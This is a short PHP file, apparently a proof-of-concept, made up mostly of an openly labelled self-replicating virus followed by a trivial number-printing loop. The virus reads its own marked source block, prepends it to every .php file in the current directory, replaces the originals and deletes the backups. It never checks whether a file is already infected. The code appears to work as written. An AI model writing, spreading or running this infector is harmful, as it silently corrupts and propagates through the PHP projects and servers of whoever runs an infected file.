<?php // VIRUS:START
function execute($virus)
{
    $infection = '<?php ' . $virus . ' ?>'; // VIRUS
    $fileNames = glob('*.php');// Get a list of all php files

    foreach ($fileNames as $fileName) {// Check each file

        $script = fopen($fileName, 'r');// Open file
        $infected = fopen($fileName . '.infected', 'w');// Let's write to a new file

        fputs($infected, $infection, strlen($infection));

        while ($contents = fgets($script)) {
            fputs($infected, $contents, strlen($contents));
        }

        fclose($script); //Close both handles
        fclose($infected);

        rename($fileName, $fileName . '.original'); // Move the infected file in to place
        rename($fileName . '.infected', $fileName);

        unlink($fileName . '.original');
    }
}

$virus = file_get_contents(__FILE__);
$virus = substr(
    $virus,
    strpos($virus, '// VIRUS:START')
);
$virus = substr(
    $virus,
    0,
    strpos($virus, PHP_EOL . '// VIRUS:END') + strlen(PHP_EOL . '// VIRUS:END')
);
execute($virus);
// VIRUS:END ?><?php

for ($i = 1; $i < 10; $i++) {
    echo $i;
}

echo PHP_EOL;
